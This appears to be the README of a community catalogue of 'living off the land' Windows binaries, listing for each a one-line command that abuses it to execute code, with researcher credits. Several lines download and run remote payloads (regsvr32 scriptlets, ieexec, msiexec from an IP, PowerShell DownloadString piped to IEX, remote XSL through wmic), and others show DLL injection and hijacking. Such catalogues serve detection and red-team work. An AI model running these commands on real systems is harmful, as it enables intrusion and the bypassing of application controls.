# LOLBins - Living Off The Land Binaries
Please contribute and do point out errors or resources I have forgotten.
If you are missing from the acknowledgement, please let me know (I did not forget anyone on purpose).    
    
   
# OS BINARIES
   
#include "OSBinaries/Rundll32.md"

[this subtext](OSBinaries/Rundll32.md)
   
   
## Regsvr32.exe
  
* Functions: Execute

```
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
```
   
Acknowledgements:
* Casey Smith - @subtee
   
   
   
## Msbuild.exe
  
* Functions: Execute

```
msbuild.exe pshell.xml
```
  
Acknowledgements:
* Casey Smith - @subtee
  
  
  
## Regsvcs.exe

* Functions: Execute

```
regsvcs.exe /U regsvcs.dll

regsvcs.exe regsvcs.dll
```

Acknowledgements:
* Casey Smith - @subtee
  
  
  
## Regasm.exe

* Functions: Execute

```
regasm.exe /U regsvcs.dll

regasm.exe regsvcs.dll
```

Acknowledgements:
* Casey Smith - @subtee
  
  
   
## InstallUtil.exe

* Functions: Execute

```
InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
```

Acknowledgements:
* Casey Smith - @subtee
   
   
   
## mshta.exe

* Functions: Execute

```
mshta.exe evilfile.hta
```

Acknowledgements:
* ?   
   
   
   
## IEExec.exe

* Functions: Execute

```
ieexec.exe http://x.x.x.x:8080/bypass.exe
```

Acknowledgements:
* ?
  
  
  
## PresentationHost.exe

* Functions: Execute

```
Presentationhost.exe C:\temp\Evil.xbap
```

Acknowledgements:
* Casey Smith - @subtee
  
   
   
## Msiexec.exe

* Functions: Execute

```
msiexec /quiet /i cmd.msi
msiexec /q /i http://192.168.100.3/tmp/cmd.png
```

Acknowledgements:
* Casey Smith - @subtee
  
  
  
## CMSTP.exe

* Functions: Execute

```
cmstp.exe /ni /s c:\cmstp\CorpVPN.inf
```

Acknowledgements:
* Oddvar Moe - @oddvarmoe
* Nick Tyrer - @NickTyrer
  
   
    
## Xwizard.exe

* Functions: DLL hijack

```
xwizard.exe  (xwizard.dll in same folder)
```

Acknowledgements:
* Adam - @Hexacorn
  
  
  
## odbcconf.exe

* Functions: Execute

```
odbcconf -f file.rsp
```

Acknowledgements:
* @subtee
   
   
   
## Forfiles.exe

* Functions: Execute

```
forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
```

Acknowledgements:
* Eric - @vector_sec
   
   
   
## SyncAppvPublishingServer.exe

* Functions: Execute

```
SyncAppvPublishingServer.exe "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX
```

Acknowledgements:
* Nick Landers - @monoxgas
   
   
   
## InfDefaultInstall.exe

* Functions: Execute

```
InfDefaultInstall.exe shady.inf
```

Acknowledgements:
* Kyle Hanslovan - @kylehanslovan
   
   
   
## Atbroker.exe

* Functions: Execute

```
ATBroker.exe /start malware
```

Acknowledgements:
* Adam - @hexacorn
   
   
   
## WMIC.exe

* Functions: Execute

```
wmic process call create calc

wmic process get brief /format:"https://www.example.com/file.xsl

wmic os get /format:"MYXSLFILE.xsl"

wmic process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"
```

Acknowledgements:
* Casey Smith - @subtee
   
   
   
## Mavinject32.exe

* Functions: Execute

```
MavInject32.exe <PID> /INJECTRUNNING <PATH DLL>

MavInject32.exe 3110 /INJECTRUNNING c:\folder\evil.dll>
```

Acknowledgements:
* Giuseppe N3mes1s - @gN3mes1s
* Adam - @hexacorn
   
   
   
## Runscripthelper.exe

* Functions: Execute

```
runscripthelper.exe surfacecheck \\?\C:\Test\Microsoft\Diagnosis\scripts\test.txt C:\Test
```

Acknowledgements:
* Matt Graeber - @mattifestation
   
   
   
## Control.exe

* Functions: Execute

```
control.exe c:\windows\tasks\file.txt:evil.dll

control.exe 
(Add registry in HKCU\Software\Microsoft\Windows\currentversion\controlpanel\CPLS to manipulate)
```

Acknowledgements:
* Jimmy - @bohops
   
   
   
## ie4unit.exe

* Functions: Execute

```
ie4unit.exe -BaseSettings
(copy out ie4unit.exe and ieuinit.inf - add SCT in the MSIE4RegisterOCX.Windows7 section)
```

Acknowledgements:
* Jimmy - @bohops
   
   
   
# OTHER MICROSOFT SIGNED BINARIES
   
## Bginfo.exe

* Functions: Execute

```
bginfo.exe bginfo.bgi /popup /nolicprompt
(Add vbs code inside .bgi file)
```

Acknowledgements:
* Oddvar Moe - @oddvarmoe
   
   
   
## msxsl.exe

* Functions: Execute

```
msxsl.exe customers.xml script.xsl
```

Acknowledgements:
* Casey Smith - @subtee
   
   
   
## winword.exe

* Functions: Execute

```
winword.exe /l dllfile.dll
```

Acknowledgements:
* Casey Smith - @subtee
   
   
   
## dnx.exe

* Functions: Execute

```
dnx.exe consoleapp
```

Acknowledgements:
* Matt Nelson - @enigma0x3
   
   
   
## cdb.exe

* Functions: Execute

```
cdb.exe -cf x64_calc.wds -o notepad.exe
```

Acknowledgements:
* Matt Graber - @mattifestation
   
   
   
## rcsi.exe

* Functions: Execute

```
rcsi.exe bypass.csx
```

Acknowledgements:
* Matt Nelson - @enigma0x3
   
   
   
## csi.exe

* Functions: Execute

```
csi.exe file
```

Acknowledgements:
* Casey Smith - @subtee
   
   
   
## te.exe

* Functions: Execute

```
te.exe bypass.wsc
```

Acknowledgements:
* * Giuseppe N3mes1s - @gN3mes1s
   
   
   
## Tracker.exe

* Functions: Execute

```
Tracker.exe /d .\calc.dll /c C:\Windows\write.exe
```

Acknowledgements:
* * Giuseppe N3mes1s - @gN3mes1s   
   
   
   
